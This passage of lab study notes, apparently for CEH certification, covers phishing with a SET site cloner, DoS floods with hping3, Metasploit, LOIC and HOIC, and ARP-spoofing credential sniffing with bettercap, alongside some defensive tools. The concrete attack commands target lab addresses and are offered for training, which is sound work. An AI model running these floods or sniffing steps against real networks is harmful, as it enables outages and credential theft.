</p><ul id="65dab4e6-d64f-415f-b3e5-b4a2ba6c61f5" class="toggle"><li><details open=""><summary>Sniff Credentials using the Social-Engineer Toolkit (SET)</summary><ul id="10be523c-e18f-4899-8218-d63107ea211a" class="bulleted-list"><li style="list-style-type:disc">Prepare the cloned site<ul id="e2c4a4a3-5232-4e2b-b498-9d047bb95288" class="bulleted-list"><li style="list-style-type:circle">Run <code>Social Engineering Toolkit</code>  (./setoolkit)</li></ul><ul id="d2dba833-6764-490e-8f9d-a225c8eb6e6a" class="bulleted-list"><li style="list-style-type:circle">Select <code>1) Social engineering Attacks</code></li></ul><ul id="d11b9497-b94b-4f4c-a9e4-d7c64925bbc4" class="bulleted-list"><li style="list-style-type:circle">Select <code>2) Website Attack Vectors</code></li></ul><ul id="440424c2-6a2b-485a-87a3-291ad301a761" class="bulleted-list"><li style="list-style-type:circle">Select <code>3) Credential Harvester Attack Method</code></li></ul><ul id="3537068f-c096-4317-a95c-4b0168f21a00" class="bulleted-list"><li style="list-style-type:circle">Select <code>4) Site Cloner</code></li></ul><ul id="91bc392b-6c7f-4441-9364-cc766d98ff1a" class="bulleted-list"><li style="list-style-type:circle">In the prompt<ul id="b1c3cc06-84bd-42cd-bd20-7a6ed04129ac" class="bulleted-list"><li style="list-style-type:square">Type where you will host the cloned server (current IP)</li></ul><ul id="7cef073e-c146-489e-ab67-3f5af5514294" class="bulleted-list"><li style="list-style-type:square">Type the URL of the site to be cloned</li></ul></li></ul></li></ul><ul id="b882edb3-9545-47b9-b7c6-07538187ed08" class="bulleted-list"><li style="list-style-type:disc">Executing the attack<ul id="7c01afcc-80b6-4056-8831-9fa3cfd209d4" class="bulleted-list"><li style="list-style-type:circle">Send an email with a <code>Link</code> of the site, and  <code>Hyperlink</code> it with your cloned site address</li></ul><ul id="d9759f83-2acb-4435-a645-4b05faad1aed" class="bulleted-list"><li style="list-style-type:circle">When the target acccesses the site, the credentials will be harvested and shown on our terminal</li></ul><ul id="da0077a1-c658-4baa-9c91-743c21e28fc3" class="bulleted-list"><li style="list-style-type:circle">Then it will redirect him to the original site and they wont even notice </li></ul></li></ul></details></li></ul><ul id="37e39a70-1832-4600-9dfd-392a0538af20" class="toggle"><li><details open=""><summary>Detect Phishing using Netcraft</summary><ul id="3cb56dea-6e2e-4c93-89a7-74169d3b0218" class="bulleted-list"><li style="list-style-type:disc">Download Netcraft extension at <strong>netcraft.com/apps</strong></li></ul><ul id="606b4295-cbed-4462-beb2-f35ec07305f6" class="bulleted-list"><li style="list-style-type:disc">It blocks suspicious sites</li></ul><ul id="a7a56b7e-14b6-4289-aa31-44be0e9bfb92" class="bulleted-list"><li style="list-style-type:disc">It ranks sites</li></ul><ul id="f81d7f11-4373-481d-ab7a-459f62df4d6a" class="bulleted-list"><li style="list-style-type:disc">If you click <code>Site Report</code> it shows alot of details about the site</li></ul></details></li></ul><ul id="09aabcc9-ba22-4035-8a01-fc0995c23985" class="toggle"><li><details open=""><summary>Detect Phishing using PhishTank</summary><p id="cf1a2973-e7ae-4d74-a0bf-7f32dd103ed2" class=""><code>phishtank.com</code></p><ul id="b4ad994b-77fa-4a03-a346-1918cf3cb935" class="bulleted-list"><li style="list-style-type:disc">People submit and others can verify phishing sites</li></ul><ul id="c1b0462a-8a3e-41bc-b710-c2d34b55cfa9" class="bulleted-list"><li style="list-style-type:disc">Also has API to use for checking sites</li></ul><ul id="b8451ba7-5c76-43a2-8e37-18216122f1e2" class="bulleted-list"><li style="list-style-type:disc">Can search for phishing sites or check if a URL is one</li></ul></details></li></ul><ul id="d9a46e24-e11f-4362-b5dc-a9c36752c918" class="toggle"><li><details open=""><summary>Audit Organization&#x27;s Security for Phishing Attacks using OhPhish</summary><ul id="ea555185-f63b-4838-9d16-36258b4c3e53" class="bulleted-list"><li style="list-style-type:disc">It can create automated phishing campains</li></ul><ul id="7cf9964b-626c-402c-8a0b-3c8720228dac" class="bulleted-list"><li style="list-style-type:disc">You select targets, templates to send, and it records who clicks on it</li></ul><ul id="f830585b-3e61-490d-9195-6b693c0ead22" class="bulleted-list"><li style="list-style-type:disc">It gives you statistics about clicks and produces reports</li></ul></details></li></ul></details></li></ul><ul id="02d4220b-19e1-42d6-984f-cf596fa553b9" class="toggle"><li><details open=""><summary>Lab 9 - Denial of Service</summary><ul id="387b687d-6d52-470e-9404-83463e54bd10" class="toggle"><li><details open=""><summary>Categories of DoS Attacks</summary><ul id="2427f176-61be-4575-9256-a4567cb4c481" class="bulleted-list"><li style="list-style-type:disc"><strong>Volumetric Attacks</strong>: Consume the bandwidth of the target network or service<p id="622b0c74-2877-4cd8-83f0-c51ac708a71a" class="">Attack techniques:</p><ul id="a416556f-198b-4dc5-ace0-e45d8e92d63f" class="bulleted-list"><li style="list-style-type:circle">UDP flood attack</li></ul><ul id="6b68df83-f081-4824-a620-43a465756457" class="bulleted-list"><li style="list-style-type:circle">ICMP flood attack</li></ul><ul id="e96c61ac-d11e-49ed-bdc7-ac2d89e8bc33" class="bulleted-list"><li style="list-style-type:circle">Ping of Death and smurf attack</li></ul><ul id="31c819fb-d517-4a5e-b4c2-a3db89800ef8" class="bulleted-list"><li style="list-style-type:circle">Pulse wave and zero-day attack</li></ul></li></ul><ul id="8b784161-2feb-4c52-b8b1-21ec879f9d21" class="bulleted-list"><li style="list-style-type:disc"><strong>Protocol Attacks</strong>: Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls, and application servers<p id="92ab4fb9-e96d-4a92-b989-fde774515f13" class="">Attack techniques:</p><ul id="38c22959-d46e-4670-8a1e-a741e4782117" class="bulleted-list"><li style="list-style-type:circle">SYN flood attack</li></ul><ul id="5f5854d4-d500-4f9e-8653-ca882699ac0c" class="bulleted-list"><li style="list-style-type:circle">Fragmentation attack</li></ul><ul id="397a9e71-2ab6-4c49-a899-c65337403517" class="bulleted-list"><li style="list-style-type:circle">Spoofed session flood attack</li></ul><ul id="0e719493-b108-4ac0-88e6-b1eee1b71595" class="bulleted-list"><li style="list-style-type:circle">ACK flood attack</li></ul></li></ul><ul id="5a3dc0ed-d11c-4a45-9531-f9c6d778eaea" class="bulleted-list"><li style="list-style-type:disc"><strong>Application Layer Attacks</strong>: Consume application resources or services, thereby making them unavailable to other legitimate users<p id="20bfb8d0-2461-4027-a3a7-8e932ba193be" class="">Attack techniques:</p><ul id="392a4d28-6863-46b4-8966-bc6e0b8201d1" class="bulleted-list"><li style="list-style-type:circle">HTTP GET/POST attack</li></ul><ul id="9d70fc65-b73a-45dc-86c5-45e5d4b2ca12" class="bulleted-list"><li style="list-style-type:circle">Slowloris attack</li></ul><ul id="fbf233d0-e183-435d-b172-3351724191ae" class="bulleted-list"><li style="list-style-type:circle">UDP application layer flood attack</li></ul><ul id="6d506a3d-b876-4475-bd88-096f7b9d90fb" class="bulleted-list"><li style="list-style-type:circle">DDoS extortion attack</li></ul></li></ul></details></li></ul><ul id="049af747-f576-4248-a352-f97a0e1fe444" class="toggle"><li><details open=""><summary>Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit</summary><p id="5b292471-ed35-470b-9049-ce11a00b8e6a" class="">SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. </p><p id="05a8d84b-3821-4e43-86cd-1cf18338a5ad" class="">The process of transmitting such packets is faster than the system can handle. </p><p id="92c7041e-6b0b-4175-92d3-c85e620e79b3" class="">Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially open connections while waiting in a listening queue for response ACK packet</p><p id="27610329-f473-4ae4-a024-cf88b3ccd1ba" class="">
</p><ul id="e8653301-cb65-4366-a5d8-af3d896889e9" class="bulleted-list"><li style="list-style-type:disc">In this scenario we targeted port 21 of a Windows machine<ul id="acb52f20-d866-49dd-afff-37223629d04a" class="bulleted-list"><li style="list-style-type:circle">It only slowed down when monitoring with Wireshark</li></ul><ul id="3a20e855-690d-482f-a726-847f558c0de7" class="bulleted-list"><li style="list-style-type:circle">But spoofing our IP worked</li></ul><p id="a4dced49-a68b-4381-86dd-d746c7e88a90" class="">
</p></li></ul><ul id="ab086f70-b1cf-4282-a11d-95cb682e3fe9" class="bulleted-list"><li style="list-style-type:disc"><code>msfconsole</code></li></ul><ul id="531d070b-faf0-49d1-943e-192ae3590924" class="bulleted-list"><li style="list-style-type:disc"><code>use auxiliary/docs/tcp/synflood</code></li></ul><ul id="8e14e867-5c0f-4e1a-a8c2-b27f5582847b" class="bulleted-list"><li style="list-style-type:disc">Options<ul id="f5cb87f9-e018-41a9-b290-6f330271cde6" class="bulleted-list"><li style="list-style-type:circle">RHOST is the target IP</li></ul><ul id="73285ca4-e774-46c8-9b16-0dbfaf3ce66d" class="bulleted-list"><li style="list-style-type:circle">RPORT is the target port</li></ul><ul id="9dcde9df-1770-4170-84fe-0d3f3c43c454" class="bulleted-list"><li style="list-style-type:circle">SHOST is the host to spoof as that one</li></ul></li></ul><ul id="8f583063-9992-4256-80eb-262aad1c94fd" class="bulleted-list"><li style="list-style-type:disc"><code>exploit</code></li></ul></details></li></ul><ul id="854450ee-c8cb-4780-a6e7-5679b25e934e" class="toggle"><li><details open=""><summary>Perform a DoS Attack on a Target Host using hping3</summary><p id="0c575279-9154-4e76-b40b-f1325dd5fb64" class="">In a PoD attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command</p><p id="02b71a53-8acf-4f00-b170-1ad77f5048f1" class="">For example, the attacker sends a packet that has a size of 65,538 bytes to the target web server. This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes. The receiving system’s reassembly process might cause the system to crash.</p><p id="0dd56634-bc3e-40cb-b208-3163a33e0160" class="">It didn’t work in this example</p><p id="9064af1a-4683-425d-85a5-f2cdc634222a" class="">But generally we target ports that are open and we know what’s behind and at what size it would crash</p><p id="aac65e95-359f-45e3-a2e7-3e86924597f0" class="">
</p><ul id="40b47d69-4c9a-4fdd-a49b-666c255b05ab" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -d 65538 -S -p 21 --flood 10.10.1.11</code><ul id="e22a4f38-a119-4271-9ef1-b77aa9e859c8" class="bulleted-list"><li style="list-style-type:circle"><code>-d</code> speficies data size</li></ul><ul id="4d635dbf-c75b-429f-b42d-78a54140b7cb" class="bulleted-list"><li style="list-style-type:circle"><code>-S</code> sets the SYN flag</li></ul><ul id="d5f1f074-7367-43d4-aeb0-34384dc13be6" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> destination port</li></ul><ul id="3a2ca50d-138d-4de7-87ca-477e8b37fd2e" class="bulleted-list"><li style="list-style-type:circle"><code>--flood</code> huge number of packets</li></ul></li></ul><ul id="658bff1f-685f-437f-8aab-4402114c8992" class="bulleted-list"><li style="list-style-type:disc">Capture it in wireshark<ul id="a9e511e2-f497-4318-9730-bf793beaf0ab" class="bulleted-list"><li style="list-style-type:circle">Then go to <code>Statistics -&gt; I/O Graphs</code></li></ul><ul id="ed837d71-7a49-46f3-8f3d-fc4baaefca56" class="bulleted-list"><li style="list-style-type:circle">Will show a graph of packet volume</li></ul><p id="ba924e9c-28cc-474b-ba54-ca78a4b9b120" class="">
</p></li></ul><ul id="2914de8c-14de-47e7-b03f-d71cf2c7c244" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -2 -p 139 --flood 10.10.1.19</code><ul id="bd2a1e32-fcfd-41c2-a8a4-488677a64903" class="bulleted-list"><li style="list-style-type:circle"><code>-2</code> sets UDP mode</li></ul><ul id="9e8b5952-79a7-43e5-a351-c073b87f6144" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> destination port</li></ul><ul id="5b985c63-9f58-4eb5-980f-42bb434d5d77" class="bulleted-list"><li style="list-style-type:circle"><code>--flood</code> huge number of packets</li></ul></li></ul><ul id="219c1c3d-3380-4ce5-b433-7327c63bfd89" class="bulleted-list"><li style="list-style-type:disc">Wireshark shows alot of UDP packets</li></ul><p id="c75db4a2-4dab-41c2-b9ae-5644717efe82" class="">
</p><ul id="c3e47a51-e2e4-4a6b-b6a5-9d122e66368f" class="bulleted-list"><li style="list-style-type:disc">Other UDP ports attackers flood:<ul id="e2460b52-8318-4007-b9d7-34ce84f89899" class="bulleted-list"><li style="list-style-type:circle">CharGEN (Port 19)</li></ul><ul id="08fbe9a6-cf6f-4ea1-aebf-46333769c331" class="bulleted-list"><li style="list-style-type:circle">SNMPv2 (Port 161)</li></ul><ul id="1cc5f113-63d4-4a1c-8b16-b490b5d6518f" class="bulleted-list"><li style="list-style-type:circle">QOTD (Port 17)</li></ul><ul id="f59c0b1c-2cd0-4b41-b0ba-dc94c864f1b4" class="bulleted-list"><li style="list-style-type:circle">RPC (Port 135)</li></ul><ul id="005ef858-1ff8-416f-8bb8-f3703316285b" class="bulleted-list"><li style="list-style-type:circle">SSDP (Port 1900)</li></ul><ul id="4527c3fe-247b-464f-b8a6-d17ecb1ea1fc" class="bulleted-list"><li style="list-style-type:circle">CLDAP (Port 389)</li></ul><ul id="84119c35-eafa-476d-8d1a-5cda9ddf4a3f" class="bulleted-list"><li style="list-style-type:circle">TFTP (Port 69)</li></ul><ul id="1389967b-865d-417e-9cf4-23d6e267c0ce" class="bulleted-list"><li style="list-style-type:circle">NetBIOS (Port 137,138,139)</li></ul><ul id="06250880-9c5a-4bea-bd93-0713feff0158" class="bulleted-list"><li style="list-style-type:circle">NTP (Port 123)</li></ul><ul id="6528c8dd-d2fb-4377-b82f-08a8f7a18f27" class="bulleted-list"><li style="list-style-type:circle">Quake Network Protocol (Port 26000)</li></ul><ul id="3b017aa9-c4a1-422d-82f7-21677622a376" class="bulleted-list"><li style="list-style-type:circle">VoIP (Port 5060)</li></ul></li></ul></details></li></ul><ul id="c0340ee0-62a3-42e4-9342-53a67be9b75d" class="toggle"><li><details open=""><summary>Perform a DoS Attack using Raven-storm</summary><p id="9dc5a8dc-b0e7-400a-bbf5-3cb7e5489ec2" class="">Wireshark shows alot of requests</p><p id="45c7bbac-6a59-4637-be3c-143bb8802c38" class="">But still doesnt slow down pc </p><p id="9b710521-70bf-4313-bb3f-86dea60b749c" class="">
</p><ul id="90e2db4c-27ab-48b4-a812-e8768b94823a" class="bulleted-list"><li style="list-style-type:disc"><code>sudo rst</code></li></ul><ul id="c195c270-d407-4bbf-af51-8e0c684b8bdd" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>l4</strong></code> and press <strong>Enter</strong> to load <strong>layer4</strong> module (UDP/TCP).</li></ul><ul id="0876e5f0-bff5-4939-a161-ec00a0748fa8" class="bulleted-list"><li style="list-style-type:disc"><code>ip &lt;target&gt;</code></li></ul><ul id="2969a3b5-f78c-4db8-a196-0e437b79fb03" class="bulleted-list"><li style="list-style-type:disc"><code>port 80</code></li></ul><ul id="af1d5359-5531-42d1-9f63-e5a28cf4cacd" class="bulleted-list"><li style="list-style-type:disc"><code>threads 20000</code></li></ul><ul id="31de27af-725e-44d8-a2e0-f415216e3efe" class="bulleted-list"><li style="list-style-type:disc"><code>run</code></li></ul><p id="3b3db17b-1c30-44ba-a9cf-a47126acf322" class=""><br/><br/></p><p id="96bd32cc-ac2b-4048-925f-477882266ab6" class="">
</p></details></li></ul><ul id="76bd1484-f695-4113-8a4c-c2ad173be316" class="toggle"><li><details open=""><summary>Perform a DDoS Attack using HOIC</summary><p id="55bbeb4f-4034-4b58-a3e8-258cb9b67850" class="">Doesn’t do shit</p><p id="918ec508-5aeb-4dbc-908b-0a02ca1c9cae" class="">
</p><ul id="072f1934-b86a-4ea0-8ab1-f64c9f91718c" class="bulleted-list"><li style="list-style-type:disc"><strong> </strong>Copy <code><strong>E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools</strong></code><code> and copy the </code><code><strong>High Orbit Ion Cannon (HOIC)</strong></code> folder to <strong>Desktop</strong>.<ul id="4342bee1-1569-494d-a302-c09204819125" class="bulleted-list"><li style="list-style-type:circle">If you run the tool directly from the shared drive in the machines one at a time, errors might occur.</li></ul></li></ul><ul id="63cd1c9a-abbd-46e3-8a67-77caf837c75b" class="bulleted-list"><li style="list-style-type:disc">Copy and run it in multiple machines to work</li></ul><ul id="b3508f43-44e0-407c-b441-d2ba2034801e" class="bulleted-list"><li style="list-style-type:disc">Press the <code>Plus (+)</code> button to add a host</li></ul><ul id="7ecab159-d76f-4f9d-819b-9caf1e201798" class="bulleted-list"><li style="list-style-type:disc">Type the <code>URL</code> , set the Power to <code>High</code> and the Booster to <code>GenericBoost.hoic</code></li></ul><ul id="931d7465-b1d6-43bd-b6d7-48b4942936cd" class="bulleted-list"><li style="list-style-type:disc">Click <code>Add</code></li></ul><ul id="24389899-1d7d-4272-af33-e501737d5330" class="bulleted-list"><li style="list-style-type:disc">Set Threads to <code>20</code></li></ul><ul id="b5728045-cc20-4c55-a25d-c702d6509f47" class="bulleted-list"><li style="list-style-type:disc"><code>FIRE TEH LAZER!</code></li></ul><p id="f1be1380-6956-4c59-8027-aed2a3671ca8" class="">
</p></details></li></ul><ul id="9bdc1b89-80b9-40d9-aa9f-f1921a697b37" class="toggle"><li><details open=""><summary>Perform a DDoS Attack using LOIC</summary><ul id="9744f51b-2589-491f-b1a0-e548cc87fcad" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC)\LOIC.exe</strong></code><strong> </strong>on multiple machines</li></ul><ul id="a1ccf94b-0739-4cb1-a59c-c94a48b46323" class="bulleted-list"><li style="list-style-type:disc">Select an <code>IP</code> and click <code>Lock on</code></li></ul><ul id="8a88c1e9-59b8-48c7-9309-a5f1a50843df" class="bulleted-list"><li style="list-style-type:disc">Set <code>Method</code> to <code>UDP</code></li></ul><ul id="2ac0ace4-ab2e-4490-a915-f760ae7aa09a" class="bulleted-list"><li style="list-style-type:disc">Set <code>Speed</code> to middle</li></ul><ul id="a1713fa9-f3bf-4694-bf28-45c430204cbd" class="bulleted-list"><li style="list-style-type:disc"><code>IMMA CHARGIN MAH LAZER</code></li></ul><ul id="64d8e4c4-383c-4f2a-aa60-f0b43453c7bd" class="bulleted-list"><li style="list-style-type:disc">Does shit</li></ul></details></li></ul><ul id="83f72b8e-4268-4dc8-bfe1-9904a5e851fa" class="toggle"><li><details open=""><summary>Detect and Protect Against DDoS Attacks using Anti DDoS Guardian</summary><p id="a7d64b5c-4498-4c8f-b4d0-f6f8ba2afa79" class="">Anti DDoS Guardian is a DDoS attack protection tool. It protects IIS servers, Apache serves, game servers, Camfrog servers, mail servers, FTP servers, VOIP PBX, and SIP servers and other systems. </p><p id="067beab5-56fb-4db4-83ad-7fa784b747e3" class="">Anti DDoS Guardian monitors each incoming and outgoing packet in Real-Time. It displays the local address, remote address, and other information of each network flow. </p><p id="f4ad4653-4987-4784-b37f-b722d4e6670b" class="">Anti DDoS Guardian limits network flow number, client bandwidth, client concurrent TCP connection number, and TCP connection rate. </p><p id="9825e25d-2428-4bf5-b544-005f2be547d6" class="">It also limits the UDP bandwidth, UDP connection rate, and UDP packet rate.</p><p id="c1f18c44-7625-4150-ac91-9273c7ef261b" class="">
</p><ul id="68ea2f51-d22f-4bc7-99e0-648fc3f5d042" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>E:\CEH-Tools\CEHv12</strong></code><code> </code><code><strong>Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian\Anti_DDoS_Guardian_setup.exe</strong></code></li></ul><ul id="498d473c-d329-4409-9c1f-f233eaa3fe85" class="bulleted-list"><li style="list-style-type:disc">In the example we run a DoS attack on the host that had the anti DoS</li></ul><ul id="609281db-cf8f-4308-8cb2-356d880a775e" class="bulleted-list"><li style="list-style-type:disc">We could see the flow of packets and right click Block the IP</li></ul><p id="318e26a4-1a6b-46e0-88b3-9538f9251dce" class="">
</p><ul id="d993a8be-994b-48b9-a0bf-cdcf4621e651" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="05242170-aac4-4663-b287-48b15d261af2" class="bulleted-list"><li style="list-style-type:disc"><strong>DOSarrest’s DDoS protection service</strong> (dosarrest.com)</li></ul><ul id="dd8b7e12-ac65-4d5f-a60f-487c18721d76" class="bulleted-list"><li style="list-style-type:disc"><strong>DDoS-GUARD</strong> (ddos-guard.net)</li></ul><ul id="e3380005-33a2-4211-aed1-74889617784f" class="bulleted-list"><li style="list-style-type:disc"><strong>Cloudflare</strong> (cloudflare.com)<br/><br/><br/></li></ul></details></li></ul><p id="e56a8f20-faf9-426f-a684-e81f8bc0ff91" class="">
</p></details></li></ul></details></li></ul><ul id="107bdadd-c4a7-80f8-8614-d0b53878fa88" class="toggle"><li><details open=""><summary>Lab 10 - Session Hijacking</summary><p id="107bdadd-c4a7-8036-b03e-f4150a6f34d7" class="">A session hijacking attack refers to the exploitation of a session token-generation mechanism or token security controls that enables an attacker to establish an unauthorized connection with a target server. </p><p id="107bdadd-c4a7-80c7-b994-cfafb197b51c" class="">The attacker guesses or steals a valid session ID (which identifies authenticated users) and uses it to establish a session with the server.</p><p id="107bdadd-c4a7-8075-b07f-ff4e912e41e6" class="">A session hijacking attack refers to the exploitation of a session token-generation mechanism or token security controls that enables an attacker to establish an unauthorized connection with a target server. </p><p id="107bdadd-c4a7-806b-91b2-caf44f90f052" class="">The attacker guesses or steals a valid session ID (which identifies authenticated users) and uses it to establish a session with the server.</p><p id="107bdadd-c4a7-8039-bdaa-d46df5e902b9" class="">
</p><ul id="107bdadd-c4a7-8083-b0c6-e03be6de2299" class="toggle"><li><details open=""><summary>Perform Session Hijacking</summary><ul id="4c8661d0-de08-4119-865f-47e4496b19f3" class="toggle"><li><details open=""><summary>Hijack a Session using Zed Attack Proxy (ZAP)</summary><p id="107bdadd-c4a7-80bb-b1dd-d8eadba73fe1" class="">tl;dr: we set up a proxy on the target  too look at zap and intercept it from ZAP</p><p id="107bdadd-c4a7-8081-b7c2-c75b71d08f97" class="">
</p><ul id="107bdadd-c4a7-80ea-8894-f27a982042aa" class="bulleted-list"><li style="list-style-type:disc">Set up a proxy on the target machine to look at ZAP ip and port 8080</li></ul><ul id="107bdadd-c4a7-8031-99e0-df21cf48aac4" class="bulleted-list"><li style="list-style-type:disc">At attacker machine, open ZAP<ul id="107bdadd-c4a7-8065-b84e-e622acc1c308" class="bulleted-list"><li style="list-style-type:circle">Click on the <code>Green Cross</code></li></ul><ul id="107bdadd-c4a7-8080-9270-e15d7d4620f5" class="bulleted-list"><li style="list-style-type:circle">Click <code>Break</code></li></ul><ul id="107bdadd-c4a7-80f8-95b1-ed962ca14837" class="bulleted-list"><li style="list-style-type:circle">A new <code>Break</code> tab will open</li></ul><ul id="107bdadd-c4a7-80f5-b766-cf0e34eb0d89" class="bulleted-list"><li style="list-style-type:circle">Click on the <code>Gear Icon</code> in the toolbar</li></ul><ul id="4ee7ed8f-1688-4cc2-a05b-e3827fc35490" class="bulleted-list"><li style="list-style-type:circle">A window will open, on the side click <code>Local Proxies</code></li></ul><ul id="107bdadd-c4a7-8045-84e3-c1bba8145460" class="bulleted-list"><li style="list-style-type:circle">Set the IP address of the current machine and port to 8080 and click <code>OK</code></li></ul><ul id="107bdadd-c4a7-800e-9af1-f6ce742cfc8d" class="bulleted-list"><li style="list-style-type:circle">Click on the <code>Green Circle Button</code> in the toolbar to start capturing requests</li></ul></li></ul><ul id="107bdadd-c4a7-8054-ac37-f682cd816784" class="bulleted-list"><li style="list-style-type:disc">Requests will now be intercepted</li></ul></details></li></ul><ul id="108bdadd-c4a7-8070-850b-ce761a52d32b" class="toggle"><li><details open=""><summary>Intercept Http Traffic using bettercap</summary><p id="108bdadd-c4a7-80f7-b7cc-e5fc0a138335" class="">Can be used for monitoring HTTP traffic and capturing unencrypted stuff</p><p id="108bdadd-c4a7-8052-b000-faace0f207e1" class="">Can use ssl stripping but arguable if it works</p><p id="e8fd2d1a-d226-4bea-b0be-58f3362822c5" class="">
</p><ul id="108bdadd-c4a7-80f5-a4c1-e617972bb1dd" class="bulleted-list"><li style="list-style-type:disc"><code>bettercap -iface eth0</code></li></ul><ul id="108bdadd-c4a7-80fe-9d66-c114872202f8" class="bulleted-list"><li style="list-style-type:disc">Type <code>net.probe on</code> <ul id="108bdadd-c4a7-80bb-8633-e88fa11f19fd" class="bulleted-list"><li style="list-style-type:circle">This module will send different types of probe packets to each IP in the current subnet for the <strong>net.recon</strong> module to detect them</li></ul></li></ul><ul id="407f03de-6a07-441a-a608-d0376a3b5297" class="bulleted-list"><li style="list-style-type:disc">Type <code>net.recon on</code><ul id="108bdadd-c4a7-8064-badb-d63dcae4da1e" class="bulleted-list"><li style="list-style-type:circle">This module will send different types of probe packets to each IP in the current subnet for the <strong>net.recon</strong> module to detect them.</li></ul></li></ul><ul id="4bbb6f59-d807-4c63-aad2-81e373b49066" class="bulleted-list"><li style="list-style-type:disc">Type<strong> </strong><code><strong>net.recon on</strong></code><ul id="108bdadd-c4a7-8006-9096-e62e33a57686" class="bulleted-list"><li style="list-style-type:circle">This module is responsible for periodically reading the system ARP table to detect new hosts on the network.</li></ul><ul id="108bdadd-c4a7-80a0-a938-e41b35c49a9f" class="bulleted-list"><li style="list-style-type:circle">The module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.</li></ul></li></ul><ul id="108bdadd-c4a7-8012-9382-ce5335cfca74" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>set http.proxy.sslstrip true</strong></code><ul id="108bdadd-c4a7-8019-992b-d52978b4f232" class="bulleted-list"><li style="list-style-type:circle">This module enables SSL stripping.</li></ul></li></ul><ul id="108bdadd-c4a7-80ff-8a12-eb2c882ecad1" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>set arp.spoof.internal true</strong></code><ul id="108bdadd-c4a7-805e-9360-fee15dca5535" class="bulleted-list"><li style="list-style-type:circle">This module spoofs the local connections among computers of the internal network.</li></ul></li></ul><ul id="108bdadd-c4a7-80c9-8f8a-e659649088a1" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>set arp.spoof.targets 10.10.1.11</strong></code><ul id="108bdadd-c4a7-80cf-8359-c55dd507310c" class="bulleted-list"><li style="list-style-type:circle">This module spoofs the IP address of the target host.</li></ul></li></ul><ul id="01e6ca8c-3a7c-4ba4-95a7-1e48ee070fc4" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>http.proxy on</strong></code><ul id="108bdadd-c4a7-8015-abdb-f6912288e31d" class="bulleted-list"><li style="list-style-type:circle">This module initiates http proxy</li></ul></li></ul><ul id="108bdadd-c4a7-8038-95ee-fdaaf89da4b1" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>arp.spoof on</strong></code><ul id="108bdadd-c4a7-80ad-861d-fdc1f1fd815b" class="bulleted-list"><li style="list-style-type:circle">This module initiates ARP spoofing.</li></ul></li></ul><ul id="108bdadd-c4a7-808b-b4ef-c706d9282711" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>net.sniff on</strong></code><ul id="108bdadd-c4a7-80cf-be18-c3dd6f5048f6" class="bulleted-list"><li style="list-style-type:circle">This module is responsible for performing sniffing on the network.</li></ul></li></ul><ul id="108bdadd-c4a7-804e-b07b-c15b1bd9d0e8" class="bulleted-list"><li style="list-style-type:disc">Type <code><strong>set net.sniff.regexp ‘.*password=.+’</strong></code><ul id="108bdadd-c4a7-80bf-9dd3-ffefb809c9c7" class="bulleted-list"><li style="list-style-type:circle">This module will only consider the packets sent with a payload matching the given regular expression (in this case, <strong>‘.*password=.+’</strong>)</li></ul></li></ul><ul id="108bdadd-c4a7-804f-ab63-e2b4e352d12a" class="bulleted-list"><li style="list-style-type:disc">Now for any credentials captured and websites visited will be recorded and packet details will be shown<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></li></ul><ol type="1" id="108bdadd-c4a7-801c-a960-ce3f7339aa88" class="numbered-list" start="1"><li>Type <strong>set arp.spoof.internal true</strong> and press <strong>Enter</strong>. This module spoofs the local connections among computers of the internal network.</li></ol><ol type="1" id="108bdadd-c4a7-804f-9f1d-ee1c60be224b" class="numbered-list" start="2"><li></li></ol><ol type="1" id="108bdadd-c4a7-80c7-9fe4-f04622a7d3a5" class="numbered-list" start="3"><li>Type <strong>set arp.spoof.internal true</strong> and press <strong>Enter</strong>. This module spoofs the local connections among computers of the internal network.</li></ol><ol type="1" id="108bdadd-c4a7-80cb-8a2e-e2e5ae0305c9" class="numbered-list" start="4"><li></li></ol></details></li></ul><ul id="eaf69076-aff4-48cc-ad94-9317acd7a41f" class="toggle"><li><details open=""><summary>Intercept HTTP Traffic using Hetty</summary><ul id="108bdadd-c4a7-80e0-8afc-f96aff4751bf" class="bulleted-list"><li style="list-style-type:disc">Attacker machine<ul id="4e366e6b-92f9-47fb-8e2a-5d87290b8432" class="bulleted-list"><li style="list-style-type:circle">Run <code>hetty.exe</code> from <code><strong>E:\CEH-Tools\CEHv12 Module 11 Session Hijacking\Hetty</strong></code></li></ul><ul id="108bdadd-c4a7-80b2-8602-ca9870482437" class="bulleted-list"><li style="list-style-type:circle">Go to <code>localhost:8080</code> </li></ul><ul id="108bdadd-c4a7-80b3-a9ec-eb5748f51135" class="bulleted-list"><li style="list-style-type:circle">Select the <code>Folder Button</code> on the sidebar</li></ul><ul id="108bdadd-c4a7-8048-9349-f3737dd70b6e" class="bulleted-list"><li style="list-style-type:circle">Create a new project</li></ul><ul id="108bdadd-c4a7-8074-8340-e070d06de1b2" class="bulleted-list"><li style="list-style-type:circle">Go to <code>Proxy Logs</code></li></ul></li></ul><ul id="108bdadd-c4a7-8077-bc4c-e0b6eaa68197" class="bulleted-list"><li style="list-style-type:disc">Victim 